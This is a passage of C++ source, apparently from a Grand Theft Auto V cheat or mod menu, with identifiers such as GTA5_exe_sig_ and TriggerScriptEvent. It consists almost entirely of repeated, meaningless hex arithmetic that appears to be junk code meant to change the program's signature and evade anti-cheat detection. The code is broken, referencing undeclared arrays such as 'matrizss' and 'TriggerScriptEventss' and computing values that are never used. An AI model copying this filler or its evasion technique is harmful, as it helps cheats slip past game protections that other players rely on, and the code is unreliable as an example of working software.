			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "PosX");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
